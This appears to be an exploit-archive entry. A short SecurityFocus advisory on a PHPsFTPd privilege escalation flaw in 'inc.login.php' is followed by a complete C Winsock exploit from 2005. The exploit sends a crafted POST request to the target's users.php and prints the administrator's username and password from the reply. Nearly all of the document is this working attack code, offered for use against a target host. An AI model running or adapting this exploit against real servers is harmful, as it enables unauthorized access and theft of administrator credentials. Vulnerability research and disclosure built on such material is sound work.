source: http://www.securityfocus.com/bid/14222/info

PHPsFTPd is affected by a privilege escalation vulnerability. PHPsFTPd is affected by a privilege escalation vulnerability. This issue is due to a failure in 'inc.login.php' when processing login credentials.

An attacker can exploit this vulnerability to retrieve the administrator username and password. This could aid in further attacks against the underlying system; other attacks are also possible. 

// PHPsFTPd Admin Password Leak
// tested on a WinXP SP1 box
// Author: Stefan Lochbihler
// Date:   11. Juli 2005


#include "stdafx.h"
#include "stdio.h"
#include "winsock2.h"

#pragma comment (lib,"ws2_32")

#define PORT 80
#define rootdir "/phpsftpd/"


typedef unsigned long ulong;


void usage(char *);
ulong checkhost(char *);



ulong checkhost(char *host)
{
struct hostent *hp;
ulong host_ip=0;

host_ip=inet_addr(host);
if(host_ip==INADDR_NONE){
    hp=gethostbyname(host);
if(!hp){
     printf("unable to resolv host...\n");
        exit(1);
        }

   host_ip= *(ulong*)hp->h_addr;

}

return host_ip;

}


void usage (char *progn){

printf("Usage[%s]: www.targethost.com\n",progn);
exit(0);

}


int main(int argc, char* argv[])
{

   WSADATA wsa;
   SOCKET client;
   WORD wsVersion;

   char httpRequest[1024];
   char recvBuffer[1024];

   char *p;

   struct sockaddr_in addr;
   int err=0,recvSize=0;

   printf("PHPsFTPd Exploit v0.1 (c) by Steve mailto:steve01@chello.at\n");

     if(argc<2)
      usage(argv[0]);


wsVersion=MAKEWORD(2,0);

   if(err=WSAStartup(wsVersion,&wsa)){
    printf("Error: WSAStartup\n");
    exit(0);
}


    client=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(client==INVALID_SOCKET){
    printf("Error: Create Socket\n");
    exit(0);
}


addr.sin_addr.s_addr = checkhost(argv[1]);
addr.sin_port = htons(PORT);
addr.sin_family = AF_INET;


memset(httpRequest,'\0',sizeof(httpRequest));

strncat(httpRequest,"POST ",sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,rootdir,sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,"users.php?action=edit&username=root
HTTP/1.1\r\n",sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,"User-Agent: PHPSFTPD ACCOUNT
MANAGER\r\n",sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,"Host:
www.targethost.com\r\n",sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,"Content-Type:
application/x-www-form-urlencoded\r\n",sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,"Content-Length:
13\r\n",sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,"\r\n",sizeof(httpRequest)-strlen(httpRequest)-1);
strncat(httpRequest,"do_login=true\r\n",sizeof(httpRequest)-strlen(httpRequest)-1);

err=connect(client,(SOCKADDR*)&addr,sizeof(addr));

//Get Http Stuff
send(client,httpRequest,strlen(httpRequest),0);
recvSize=recv(client,recvBuffer,sizeof(recvBuffer)-1,0);
recvBuffer[recvSize]='\0';
//Get username & password
recvSize=recv(client,recvBuffer,sizeof(recvBuffer)-1,0);
recvBuffer[recvSize]='\0';


//shit when anyone use a 0x20 on his password
p=strstr(recvBuffer,"value=");
printf("Username:");

for(p=p+6;*p!=0x20;p++)
putc(*p,stdout);

p=strstr(p,"value=");

printf("\n");
printf("Password:");

for(p=p+6;*p!=0x20;p++)
putc(*p,stdout);


closesocket(client);
WSACleanup();

printf("\n");
return 0;
}
